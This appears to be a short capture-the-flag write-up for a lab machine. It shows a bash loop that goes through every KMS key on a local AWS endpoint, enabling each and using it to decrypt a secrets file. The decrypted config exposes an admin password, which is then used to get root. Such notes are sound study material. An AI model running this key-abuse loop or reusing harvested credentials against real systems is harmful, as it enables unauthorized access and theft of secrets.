# AWS

## KMS Available Keys for decrypting servers.enc file

![[Pasted image 20210618215229.png]]


## Script to bruteforce the keys for decryption

```bash
`for KEY in $(aws --endpoint-url="http://127.0.0.1:4566/" kms list-keys | grep KeyId | awk -F\" '{ print $4 }'); do aws --endpoint-url="http://127.0.0.1:4566/" kms enable-key --key-id "${KEY}"; aws --endpoint-url="http://127.0.0.1:4566/" kms decrypt --key-id "${KEY}" --ciphertext-blob "fileb:///home/david/Projects/Prod_Deployment/servers.enc" --encryption-algorithm "RSAES_OAEP_SHA_256" --output "text" --query "Plaintext"; done`
```

```
H4sIAAAAAAAAAytOLSpLLSrWq8zNYaAVMAACMxMTMA0E6LSBkaExg6GxubmJqbmxqZkxg4GhkYGhAYOCAc1chARKi0sSixQUGIry80vwqSMkP0RBMTj+rbgUFHIyi0tS8xJTUoqsFJSUgAIF+UUlVgoWBkBmRn5xSTFIkYKCrkJyalFJsV5xZl62XkZJElSwLLE0pwQhmJKaBhIoLYaYnZeYm2qlkJiSm5kHMjixuNhKIb40tSqlNFDRNdLU0SMt1YhroINiRIJiaP4vzkynmR2E878hLP+bGALZBoaG5qamo/mfHsCgsY3JUVnT6ra3Ea8jq+qJhVuVUw32RXC+5E7RteNPdm7ff712xavQy6bsqbYZO3alZbyJ22V5nP/XtANG+iunh08t2GdR9vUKk2ON1IfdsSs864IuWBr95xPdoDtL9cA+janZtRmJyt8crn9a5V7e9aXp1BcO7bfCFyZ0v1w6a8vLAw7OG9crNK/RWukXUDTQATEKRsEoGAWjYBSMglEwCkbBKBgFo2AUjIJRMApGwSgYBaNgFIyCUTAKRsEoGAWjYBSMglEwRAEATgL7TAAoAAA=
```


#### base64 decode will generate a gzip file, which decompressing generates a targz file, which decompressing again, results into:

```bash
cat servers.yml 
server:
  listenaddr: ""
  port: 80
  hosts:
    - certs.sink.htb
    - vault.sink.htb
defaultuser:
  name: admin
  pass: _uezduQ!EY5AHfe2
```


Using the password as su - root, we successfully got root